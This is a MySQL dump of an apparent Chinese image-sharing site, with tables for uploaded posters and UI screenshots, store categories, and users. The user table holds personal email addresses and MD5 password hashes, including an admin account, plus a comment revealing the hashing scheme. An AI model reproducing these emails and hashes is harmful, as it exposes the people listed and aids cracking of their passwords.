INSERT INTO `dz_share` VALUES ('139', '32', '5', '18', '展会海报1', '/Uploads/attachments/2016/12/30/5865ccd03c756', 'upload', '', '#26282E', '0', '0', '0', '0', '1483066587');
INSERT INTO `dz_share` VALUES ('140', '32', '5', '18', '海报2', '/Uploads/attachments/2016/12/30/5865ccee67b98', 'upload', '', '#26282E', '0', '0', '0', '0', '1483066619');
INSERT INTO `dz_share` VALUES ('141', '32', '5', '18', '海报3', '/Uploads/attachments/2016/12/30/5865cd09f2e90', 'upload', '', '#26282E', '0', '0', '0', '0', '1483066641');
INSERT INTO `dz_share` VALUES ('142', '32', '5', '18', '海报4', '/Uploads/attachments/2016/12/30/5865cd4794b1c', 'upload', '', '#26282E', '0', '0', '0', '0', '1483066701');
INSERT INTO `dz_share` VALUES ('143', '32', '5', '18', '蔬菜三折页', '/Uploads/attachments/2016/12/30/5865cd9554dac', 'upload', '', '#26282E', '0', '0', '0', '0', '1483066781');
INSERT INTO `dz_share` VALUES ('146', '32', '5', '18', '地铁广告2', '/Uploads/attachments/2016/12/30/5865cde41c92a', 'upload', '', '#26282E', '0', '0', '0', '0', '1483066865');
INSERT INTO `dz_share` VALUES ('145', '32', '5', '18', '地铁广告', '/Uploads/attachments/2016/12/30/5865cdcb4ca35', 'upload', '', '#26282E', '0', '0', '0', '0', '1483066835');
INSERT INTO `dz_share` VALUES ('147', '32', '5', '19', 'app02', '/Uploads/attachments/2016/12/30/5865cecb2efdb', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067116');
INSERT INTO `dz_share` VALUES ('148', '32', '5', '19', '单个项目管理', '/Uploads/attachments/2016/12/30/5865cefc89534', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067139');
INSERT INTO `dz_share` VALUES ('149', '32', '5', '19', '对比', '/Uploads/attachments/2016/12/30/5865cf1a2c8f7', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067167');
INSERT INTO `dz_share` VALUES ('150', '32', '5', '19', '分析结果', '/Uploads/attachments/2016/12/30/5865cf2755058', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067180');
INSERT INTO `dz_share` VALUES ('151', '32', '5', '19', '分析中', '/Uploads/attachments/2016/12/30/5865cf354b64e', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067194');
INSERT INTO `dz_share` VALUES ('152', '32', '5', '19', '购物车', '/Uploads/attachments/2016/12/30/5865cf43eabec', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067208');
INSERT INTO `dz_share` VALUES ('153', '32', '5', '19', '固网', '/Uploads/attachments/2016/12/30/5865cf539e709', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067224');
INSERT INTO `dz_share` VALUES ('154', '32', '5', '19', '固网展开', '/Uploads/attachments/2016/12/30/5865cf611361f', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067241');
INSERT INTO `dz_share` VALUES ('155', '32', '5', '19', '话务预测', '/Uploads/attachments/2016/12/30/5865cf7321bf0', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067256');
INSERT INTO `dz_share` VALUES ('156', '32', '5', '19', '话务预测2', '/Uploads/attachments/2016/12/30/5865cf82a5ef6', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067272');
INSERT INTO `dz_share` VALUES ('157', '32', '5', '19', '话务预测2下拉', '/Uploads/attachments/2016/12/30/5865cf91bf7e7', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067292');
INSERT INTO `dz_share` VALUES ('158', '32', '5', '19', '进入上传数据', '/Uploads/attachments/2016/12/30/5865cfa55d855', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067313');
INSERT INTO `dz_share` VALUES ('159', '32', '5', '19', '进入评估范围', '/Uploads/attachments/2016/12/30/5865cfc2c9c67', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067338');
INSERT INTO `dz_share` VALUES ('160', '32', '5', '19', '进入评估分析', '/Uploads/attachments/2016/12/30/5865cfd2e5e9f', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067353');
INSERT INTO `dz_share` VALUES ('161', '32', '5', '19', '进入评估报告', '/Uploads/attachments/2016/12/30/5865cfe3357d0', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067369');
INSERT INTO `dz_share` VALUES ('162', '32', '5', '19', '开始分析', '/Uploads/attachments/2016/12/30/5865cff462c37', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067385');
INSERT INTO `dz_share` VALUES ('163', '32', '5', '19', '评估报告', '/Uploads/attachments/2016/12/30/5865d002d4359', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067400');
INSERT INTO `dz_share` VALUES ('164', '32', '5', '19', '全球大数据', '/Uploads/attachments/2016/12/30/5865d0135c838', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067419');
INSERT INTO `dz_share` VALUES ('165', '32', '5', '19', '容量评估', '/Uploads/attachments/2016/12/30/5865d0249d22b', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067433');
INSERT INTO `dz_share` VALUES ('166', '32', '5', '19', '首页1', '/Uploads/attachments/2016/12/30/5865d0316c9a4', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067446');
INSERT INTO `dz_share` VALUES ('167', '32', '5', '19', '首页2', '/Uploads/attachments/2016/12/30/5865d040ecbb8', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067461');
INSERT INTO `dz_share` VALUES ('168', '32', '5', '19', '首页3', '/Uploads/attachments/2016/12/30/5865d04d8a6dd', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067475');
INSERT INTO `dz_share` VALUES ('169', '32', '5', '19', '首页4', '/Uploads/attachments/2016/12/30/5865d05b44b9b', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067488');
INSERT INTO `dz_share` VALUES ('170', '32', '5', '19', '项目管理', '/Uploads/attachments/2016/12/30/5865d0690739b', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067502');
INSERT INTO `dz_share` VALUES ('171', '32', '5', '19', '项目数据输入', '/Uploads/attachments/2016/12/30/5865d0769aa28', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067521');
INSERT INTO `dz_share` VALUES ('172', '32', '5', '19', '信息服务', '/Uploads/attachments/2016/12/30/5865d08adbdc3', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067535');
INSERT INTO `dz_share` VALUES ('173', '32', '5', '19', '专业服务', '/Uploads/attachments/2016/12/30/5865d09ae8fe7', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067554');
INSERT INTO `dz_share` VALUES ('174', '32', '5', '19', '高效运维', '/Uploads/attachments/2016/12/30/5865d0aaaa2a0', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067567');
INSERT INTO `dz_share` VALUES ('175', '32', '5', '19', '稳健网络', '/Uploads/attachments/2016/12/30/5865d0b72746c', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067582');
INSERT INTO `dz_share` VALUES ('176', '32', '5', '19', '升级浏览器', '/Uploads/attachments/2016/12/30/5865d0ddd6bd0', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067629');
INSERT INTO `dz_share` VALUES ('177', '32', '5', '19', '修改密码', '/Uploads/attachments/2016/12/30/5865d0f57943c', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067642');
INSERT INTO `dz_share` VALUES ('178', '32', '5', '19', '加载ic', '/Uploads/attachments/2016/12/30/5865d10271396', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067656');
INSERT INTO `dz_share` VALUES ('179', '32', '5', '19', '加载ICe', '/Uploads/attachments/2016/12/30/5865d11503afa', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067681');
INSERT INTO `dz_share` VALUES ('180', '32', '5', '19', 'esn', '/Uploads/attachments/2016/12/30/5865d1290d290', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067692');
INSERT INTO `dz_share` VALUES ('181', '32', '5', '19', '创建新页面', '/Uploads/attachments/2016/12/30/5865d1361b8a1', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067708');
INSERT INTO `dz_share` VALUES ('182', '32', '5', '19', '新建项目', '/Uploads/attachments/2016/12/30/5865d145a7fde', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067722');
INSERT INTO `dz_share` VALUES ('183', '32', '5', '19', '项目列表', '/Uploads/attachments/2016/12/30/5865d154c681c', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067738');
INSERT INTO `dz_share` VALUES ('184', '32', '5', '19', '任务列表', '/Uploads/attachments/2016/12/30/5865d1636fb2c', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067752');
INSERT INTO `dz_share` VALUES ('185', '32', '5', '19', '任务列表无线', '/Uploads/attachments/2016/12/30/5865d17656504', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067772');
INSERT INTO `dz_share` VALUES ('186', '32', '5', '19', '无线导入数据', '/Uploads/attachments/2016/12/30/5865d1853e67f', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067787');
INSERT INTO `dz_share` VALUES ('187', '32', '5', '19', '导入数据弹出框', '/Uploads/attachments/2016/12/30/5865d1967509e', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067805');
INSERT INTO `dz_share` VALUES ('188', '32', '5', '19', '固网还原数据', '/Uploads/attachments/2016/12/30/5865d1a6039f5', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067819');
INSERT INTO `dz_share` VALUES ('189', '32', '5', '19', '固网获取数据', '/Uploads/attachments/2016/12/30/5865d1b4699e9', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067834');
INSERT INTO `dz_share` VALUES ('190', '32', '5', '19', '固网配置权重\n', '/Uploads/attachments/2016/12/30/5865d1c4b5e81', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067851');
INSERT INTO `dz_share` VALUES ('191', '32', '5', '19', '固网选择数据', '/Uploads/attachments/2016/12/30/5865d1d42503e', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067866');
INSERT INTO `dz_share` VALUES ('192', '32', '5', '19', '核心网选择', '/Uploads/attachments/2016/12/30/5865d1e1df97f', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067881');
INSERT INTO `dz_share` VALUES ('193', '32', '5', '19', '开始分析\n', '/Uploads/attachments/2016/12/30/5865d1f37d419', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067896');
INSERT INTO `dz_share` VALUES ('194', '32', '5', '19', '开始分析弹出', '/Uploads/attachments/2016/12/30/5865d207abd13', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067917');
INSERT INTO `dz_share` VALUES ('195', '32', '5', '19', '开始分析', '/Uploads/attachments/2016/12/30/5865d2229cc3e', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067944');
INSERT INTO `dz_share` VALUES ('196', '32', '5', '19', '开始分析', '/Uploads/attachments/2016/12/30/5865d2338e993', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067964');
INSERT INTO `dz_share` VALUES ('197', '32', '5', '19', '加入收藏', '/Uploads/attachments/2016/12/30/5865d249ab99d', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067982');
INSERT INTO `dz_share` VALUES ('198', '32', '5', '19', '加入收藏', '/Uploads/attachments/2016/12/30/5865d25684183', 'upload', '', '#26282E', '0', '0', '0', '0', '1483067995');
INSERT INTO `dz_share` VALUES ('199', '32', '5', '19', '项目趋势', '/Uploads/attachments/2016/12/30/5865d263e2754', 'upload', '', '#26282E', '0', '0', '0', '0', '1483068011');
INSERT INTO `dz_share` VALUES ('200', '32', '5', '19', '项目对比', '/Uploads/attachments/2016/12/30/5865d273e918e', 'upload', '', '#26282E', '0', '0', '0', '0', '1483068025');
INSERT INTO `dz_share` VALUES ('201', '32', '5', '19', '单一项目结果', '/Uploads/attachments/2016/12/30/5865d285180ac', 'upload', '', '#26282E', '0', '0', '0', '0', '1483068042');
INSERT INTO `dz_share` VALUES ('202', '32', '5', '19', '单一项目结果', '/Uploads/attachments/2016/12/30/5865d297496cb', 'upload', '', '#26282E', '0', '0', '0', '0', '1483068062');
INSERT INTO `dz_share` VALUES ('203', '32', '5', '19', '项目浏览对比弹出', '/Uploads/attachments/2016/12/30/5865d2aaca0ba', 'upload', '', '#26282E', '0', '0', '0', '0', '1483068083');
INSERT INTO `dz_share` VALUES ('204', '32', '5', '19', 'ui界面', '/Uploads/attachments/2016/12/30/5865d32f7047f', 'upload', '', '#26282E', '0', '0', '0', '0', '1483068219');
INSERT INTO `dz_share` VALUES ('205', '32', '5', '19', 'ui界面2', '/Uploads/attachments/2016/12/30/5865d3473e62b', 'upload', '', '#26282E', '0', '0', '0', '0', '1483068237');
INSERT INTO `dz_share` VALUES ('206', '32', '5', '19', 'ui界面3', '/Uploads/attachments/2016/12/30/5865d3555373d', 'upload', '', '#26282E', '0', '0', '0', '0', '1483068251');
INSERT INTO `dz_share` VALUES ('207', '32', '5', '19', 'ui界面4', '/Uploads/attachments/2016/12/30/5865d3658bcd4', 'upload', '', '#26282E', '0', '0', '0', '0', '1483068270');
INSERT INTO `dz_share` VALUES ('208', '32', '5', '19', 'ui界面5', '/Uploads/attachments/2016/12/30/5865d377589c3', 'upload', '', '#26282E', '0', '0', '0', '0', '1483068284');
INSERT INTO `dz_share` VALUES ('209', '32', '5', '19', 'ui界面6', '/Uploads/attachments/2016/12/30/5865d3850c6b1', 'upload', '', '#26282E', '0', '0', '0', '0', '1483068298');
INSERT INTO `dz_share` VALUES ('210', '32', '5', '19', 'ui界面7', '/Uploads/attachments/2016/12/30/5865d392268b9', 'upload', '', '#26282E', '0', '0', '0', '0', '1483068311');
INSERT INTO `dz_share` VALUES ('211', '32', '5', '19', 'UI界面8', '/Uploads/attachments/2016/12/30/5865d47dc447a', 'upload', '', '#26282E', '0', '0', '0', '0', '1483068551');
INSERT INTO `dz_share` VALUES ('212', '32', '5', '19', 'ui界面9', '/Uploads/attachments/2016/12/30/5865d4956e0b9', 'upload', '', '#26282E', '0', '0', '0', '0', '1483068572');
INSERT INTO `dz_share` VALUES ('214', '32', '5', '18', '单页', '/Uploads/attachments/2016/12/30/5865d5801e44f', 'upload', '', '#26282E', '0', '0', '0', '0', '1483068804');
INSERT INTO `dz_share` VALUES ('216', '32', '5', '18', '01海报', '/Uploads/attachments/2016/12/30/5865d66882e0f', 'upload', '', '#26282E', '0', '0', '0', '0', '1483069041');
INSERT INTO `dz_share` VALUES ('217', '32', '5', '18', '02海报', '/Uploads/attachments/2016/12/30/5865d91514d5a', 'upload', '', '#26282E', '0', '0', '0', '0', '1483069724');
INSERT INTO `dz_share` VALUES ('218', '32', '5', '18', '03海报', '/Uploads/attachments/2016/12/30/5865d92720668', 'upload', '', '#26282E', '0', '0', '0', '0', '1483069740');
INSERT INTO `dz_share` VALUES ('219', '32', '5', '18', '04海报', '/Uploads/attachments/2016/12/30/5865d9372a4bf', 'upload', '', '#26282E', '0', '0', '0', '0', '1483069755');
INSERT INTO `dz_share` VALUES ('220', '32', '5', '18', '05海报', '/Uploads/attachments/2016/12/30/5865d945a2bbf', 'upload', '', '#26282E', '0', '0', '0', '0', '1483069771');
INSERT INTO `dz_share` VALUES ('221', '32', '5', '18', '06海报', '/Uploads/attachments/2016/12/30/5865d956bfa3a', 'upload', '', '#26282E', '0', '0', '0', '0', '1483069787');
INSERT INTO `dz_share` VALUES ('222', '32', '5', '18', '07海报', '/Uploads/attachments/2016/12/30/5865d9660313a', 'upload', '', '#26282E', '0', '0', '0', '0', '1483069802');
INSERT INTO `dz_share` VALUES ('223', '32', '5', '18', '08海报', '/Uploads/attachments/2016/12/30/5865d97a10711', 'upload', '', '#26282E', '0', '0', '0', '0', '1483069823');
INSERT INTO `dz_share` VALUES ('224', '32', '5', '18', '09海报', '/Uploads/attachments/2016/12/30/5865d98c11427', 'upload', '', '#26282E', '0', '0', '0', '0', '1483069843');
INSERT INTO `dz_share` VALUES ('225', '32', '5', '18', '10海报', '/Uploads/attachments/2016/12/30/5865d9a8b46c3', 'upload', '', '#26282E', '0', '0', '0', '0', '1483069870');
INSERT INTO `dz_share` VALUES ('226', '32', '5', '18', '11海报', '/Uploads/attachments/2016/12/30/5865d9c1b811b', 'upload', '', '#26282E', '0', '0', '0', '0', '1483069895');
INSERT INTO `dz_share` VALUES ('227', '32', '5', '18', '12海报', '/Uploads/attachments/2016/12/30/5865d9db13863', 'upload', '', '#26282E', '0', '0', '0', '0', '1483069920');
INSERT INTO `dz_share` VALUES ('228', '32', '5', '18', '13海报', '/Uploads/attachments/2016/12/30/5865da1d70b8f', 'upload', '', '#26282E', '0', '0', '0', '0', '1483069989');
INSERT INTO `dz_share` VALUES ('229', '32', '5', '18', '14海报', '/Uploads/attachments/2016/12/30/5865da46db999', 'upload', '', '#26282E', '0', '0', '0', '0', '1483070028');
INSERT INTO `dz_share` VALUES ('230', '32', '5', '18', '15海报', '/Uploads/attachments/2016/12/30/5865da6861c61', 'upload', '', '#26282E', '0', '0', '0', '0', '1483070061');
INSERT INTO `dz_share` VALUES ('231', '32', '5', '18', '16海报', '/Uploads/attachments/2016/12/30/5865dac3ae545', 'upload', '', '#26282E', '0', '0', '0', '0', '1483070157');
INSERT INTO `dz_share` VALUES ('232', '32', '5', '18', '17海报', '/Uploads/attachments/2016/12/30/5865dae54eee1', 'upload', '', '#26282E', '0', '0', '0', '0', '1483070186');
INSERT INTO `dz_share` VALUES ('233', '32', '5', '18', '18海报', '/Uploads/attachments/2016/12/30/5865db2b900d2', 'upload', '', '#26282E', '0', '0', '0', '0', '1483070260');
INSERT INTO `dz_share` VALUES ('234', '32', '5', '18', '19海报', '/Uploads/attachments/2016/12/30/5865db87481e9', 'upload', '', '#26282E', '0', '0', '0', '0', '1483070350');
INSERT INTO `dz_share` VALUES ('235', '32', '5', '17', '刘土地vi', '/Uploads/attachments/2016/12/30/5866054215be4', 'upload', '', '#26282E', '0', '0', '0', '0', '1483081136');

-- ----------------------------
-- Table structure for dz_store_category
-- ----------------------------
DROP TABLE IF EXISTS `dz_store_category`;
CREATE TABLE `dz_store_category` (
  `store_category_id` int(11) NOT NULL AUTO_INCREMENT,
  `store_category_name` varchar(80) NOT NULL COMMENT '好店分类名',
  `is_open` tinyint(4) DEFAULT '1' COMMENT '是否开启此分类',
  `parent_id` int(11) NOT NULL DEFAULT '0' COMMENT '父分类ID',
  `display_order` int(11) NOT NULL DEFAULT '100' COMMENT '默认排序100',
  PRIMARY KEY (`store_category_id`),
  KEY `idx_parent_id` (`parent_id`)
) ENGINE=MyISAM AUTO_INCREMENT=31 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dz_store_category
-- ----------------------------
INSERT INTO `dz_store_category` VALUES ('1', '生活服务', '1', '0', '100');
INSERT INTO `dz_store_category` VALUES ('2', '网络购物', '1', '0', '100');
INSERT INTO `dz_store_category` VALUES ('3', '美食餐饮', '1', '0', '100');
INSERT INTO `dz_store_category` VALUES ('4', '家居建材', '1', '0', '100');
INSERT INTO `dz_store_category` VALUES ('5', '休闲娱乐', '1', '0', '100');
INSERT INTO `dz_store_category` VALUES ('6', '婚嫁', '1', '1', '100');
INSERT INTO `dz_store_category` VALUES ('7', '母婴', '1', '1', '100');
INSERT INTO `dz_store_category` VALUES ('8', '美容美发', '1', '1', '100');
INSERT INTO `dz_store_category` VALUES ('9', '摄影写真', '1', '1', '100');
INSERT INTO `dz_store_category` VALUES ('10', '宠物', '1', '1', '100');
INSERT INTO `dz_store_category` VALUES ('11', '服装服饰', '1', '2', '100');
INSERT INTO `dz_store_category` VALUES ('12', '数码家电', '1', '2', '100');
INSERT INTO `dz_store_category` VALUES ('13', '虚拟产品', '1', '2', '100');
INSERT INTO `dz_store_category` VALUES ('14', '食品', '1', '2', '100');
INSERT INTO `dz_store_category` VALUES ('15', '家居日用', '1', '2', '100');
INSERT INTO `dz_store_category` VALUES ('16', '自助', '1', '3', '100');
INSERT INTO `dz_store_category` VALUES ('17', '料理', '1', '3', '100');
INSERT INTO `dz_store_category` VALUES ('18', '餐厅', '1', '3', '100');
INSERT INTO `dz_store_category` VALUES ('19', '茶室', '1', '3', '100');
INSERT INTO `dz_store_category` VALUES ('20', '咖啡馆', '1', '3', '100');
INSERT INTO `dz_store_category` VALUES ('21', '装修装饰', '1', '4', '100');
INSERT INTO `dz_store_category` VALUES ('22', '家政保姆', '1', '4', '100');
INSERT INTO `dz_store_category` VALUES ('23', '家具', '1', '4', '100');
INSERT INTO `dz_store_category` VALUES ('24', '建材', '1', '4', '100');
INSERT INTO `dz_store_category` VALUES ('25', '家装设计', '1', '4', '100');
INSERT INTO `dz_store_category` VALUES ('26', '酒吧', '1', '5', '100');
INSERT INTO `dz_store_category` VALUES ('27', 'KTV', '1', '5', '100');
INSERT INTO `dz_store_category` VALUES ('28', '健身', '1', '5', '100');
INSERT INTO `dz_store_category` VALUES ('29', '旅游度假', '1', '5', '100');
INSERT INTO `dz_store_category` VALUES ('30', '户外', '1', '5', '100');

-- ----------------------------
-- Table structure for dz_user
-- ----------------------------
DROP TABLE IF EXISTS `dz_user`;
CREATE TABLE `dz_user` (
  `user_id` int(11) NOT NULL AUTO_INCREMENT,
  `email` varchar(80) NOT NULL COMMENT '用户注册邮箱',
  `passwd` varchar(100) NOT NULL COMMENT '用户密码MD5+''diuzhuan‘',
  `nickname` varchar(80) NOT NULL COMMENT '用户昵称',
  `gender` tinyint(1) DEFAULT NULL COMMENT '性别',
  `province` varchar(20) DEFAULT NULL COMMENT '省',
  `city` varchar(20) DEFAULT NULL COMMENT '市',
  `location` varchar(20) DEFAULT NULL COMMENT '详细地址',
  `bio` text NOT NULL COMMENT '用户介绍',
  `create_time` int(10) NOT NULL COMMENT '创建时间的unix时间戳',
  `total_follows` int(11) DEFAULT '0' COMMENT '总关注数',
  `total_followers` int(11) DEFAULT '0' COMMENT '总被关注数',
  `total_shares` int(11) DEFAULT '0' COMMENT '总分享数',
  `total_albums` int(11) DEFAULT '0' COMMENT '总图夹数',
  `total_likes` int(11) DEFAULT '0' COMMENT '总喜欢数',
  `total_favorite_shares` int(11) DEFAULT '0' COMMENT '总喜欢的分享数',
  `total_favorite_albums` int(11) DEFAULT '0' COMMENT '总喜欢的图夹数',
  `avatar_local` varchar(255) DEFAULT NULL COMMENT '用户头像地址',
  `is_shop` tinyint(4) DEFAULT '0' COMMENT '是否是商家',
  `is_deleted` tinyint(4) NOT NULL DEFAULT '0' COMMENT '是否禁用',
  `last_login_time` int(10) DEFAULT NULL COMMENT '最近一次登录时间',
  `role_id` smallint(6) DEFAULT '0' COMMENT '用户分组ID',
  PRIMARY KEY (`user_id`),
  KEY `idx_login` (`email`,`passwd`),
  KEY `idx_nickname` (`nickname`),
  KEY `idx_email` (`email`)
) ENGINE=MyISAM AUTO_INCREMENT=37 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dz_user
-- ----------------------------
INSERT INTO `dz_user` VALUES ('8', 'admin@admin.com', '447b613a3caafc2c0eec553503c70463', '系统管理员', null, null, null, null, '', '0', '0', '0', '0', '0', '0', '0', '0', null, '0', '0', null, '9');
INSERT INTO `dz_user` VALUES ('24', 'porter@porter.com', '555d66281966b36faac37b971d4ae17b', 'porter', '1', '北京', null, null, '范德萨富士达地方', '1388641633', '14', '0', '16', '3', '0', '9', '0', '/Uploads/avatar/24', '0', '0', null, '0');
INSERT INTO `dz_user` VALUES ('30', 'porter@porter3.com', '555d66281966b36faac37b971d4ae17b', 'porter3', '0', null, null, null, '', '1388742129', '0', '0', '5', '0', '0', '0', '0', '/Public/Img/avatar/', '0', '0', null, '0');
INSERT INTO `dz_user` VALUES ('29', 'test@test.com', '555d66281966b36faac37b971d4ae17b', 'test123', '0', null, null, null, '', '1388737816', '0', '0', '4', '0', '0', '3', '0', '/Public/Img/avatar', '0', '0', null, '0');
INSERT INTO `dz_user` VALUES ('31', '379515892@qq.com', '447b613a3caafc2c0eec553503c70463', 'porter', '0', null, null, null, '', '1482940155', '1', '0', '1', '1', '0', '0', '0', '/Public/Img/avatar', '0', '0', null, '0');
INSERT INTO `dz_user` VALUES ('32', '1240128792@qq.com', 'c3b8f231d0e7dfaca8bb47861a60406d', 'haile', '1', null, null, null, '', '1482994686', '0', '1', '162', '3', '0', '0', '0', '/Public/Img/avatar', '0', '0', null, '0');
INSERT INTO `dz_user` VALUES ('33', 'root@phpinfo.me', '677fc1dd364af92c3d1d8dbece1bf602', 'lcyss', '0', '北京', '东城区', null, '', '1483087971', '0', '0', '0', '1', '0', '0', '0', '/Public/Img/avatar', '0', '0', null, '0');
INSERT INTO `dz_user` VALUES ('34', 'mr.brian23@mail.ru', '99e80d1369c5eb052867ccaf5c1f56ac', 'JackieKneek', null, null, null, null, '', '1486452630', '0', '0', '0', '0', '0', '0', '0', '/Public/Img/avatar', '0', '0', null, '0');
INSERT INTO `dz_user` VALUES ('35', 'mr.brian23@mail.ru', '99e80d1369c5eb052867ccaf5c1f56ac', 'JackieKneek', null, null, null, null, '', '1486471913', '0', '0', '0', '0', '0', '0', '0', '/Public/Img/avatar', '0', '0', null, '0');
INSERT INTO `dz_user` VALUES ('36', 'davidvow@mail.ru', 'f6cc091c3b3d87b7e7ece9980a203415', 'DavidEcorm', null, null, null, null, '', '1489869929', '0', '0', '0', '0', '0', '0', '0', '/Public/Img/avatar', '0', '0', null, '0');
